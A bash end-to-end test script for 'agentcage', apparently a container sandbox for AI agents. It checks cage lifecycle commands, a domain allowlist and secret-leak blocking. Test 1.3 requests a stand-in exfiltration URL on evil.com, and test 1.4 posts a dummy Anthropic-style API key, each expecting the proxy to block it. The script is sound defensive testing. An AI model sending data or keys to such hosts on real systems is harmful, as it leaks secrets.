#!/usr/bin/env bash
# Phase 1: Container Mode — Lifecycle & Core Security
source "$(dirname "$0")/lib.sh"
preflight_check agentcage podman curl
phase_header 1 "Container Mode — Lifecycle & Core Security"

CAGE="basic"
BASE="http://localhost:3000"

# Clean any stale cage
destroy_cage "$CAGE"
register_cage "$CAGE"

# Setup
echo "Creating cage..."
create_cage "$REPO_ROOT/examples/basic/cage.yaml" >/dev/null
echo "Starting mock server..."
start_mock "$CAGE" httpbin.org example.com

echo "Waiting for readiness..."
if ! wait_ready "$BASE" 120; then
  e2e_fail "1.0" "Agent readiness" "did not become ready within 120s"
  print_results; exit 1
fi

# Re-patch after proxy is fully up (ExecStartPost may have restarted it)
repatch_mock "$CAGE" httpbin.org example.com

# Tests
assert_http 200 "$BASE/" "1.1" "Health check"
assert_http 200 "$BASE/fetch?url=http://httpbin.org/get" "1.2" "Allowed domain (httpbin.org)"
assert_http_any "403|502" "$BASE/fetch?url=http://evil.com/exfil" "1.3" "Blocked domain (evil.com)"

# Secret detection — use a pattern that matches the anthropic_key regex
assert_http_any "403|502" "$BASE/check-secret" "1.4" "Secret leak blocked" \
  -X POST -H "Content-Type: application/json" \
  -d '{"key":"sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}'

assert_http 200 "$BASE/check-secret" "1.5" "Clean POST allowed" \
  -X POST -H "Content-Type: application/json" \
  -d '{"data":"harmless"}'

# Verify / show / list
assert_output_contains "1.6" "Verify command" "passed" \
  agentcage cage verify "$CAGE"

assert_output_contains "1.7" "Show command" "running" \
  agentcage cage show "$CAGE"

assert_output_contains "1.8" "List command" "$CAGE" \
  agentcage cage list

# Keep cage running for phase 2 / 4 if run together
if [ "${E2E_KEEP_BASIC:-}" = "1" ]; then
  # Remove from cleanup list
  E2E_CAGES_TO_CLEANUP=()
fi

print_results
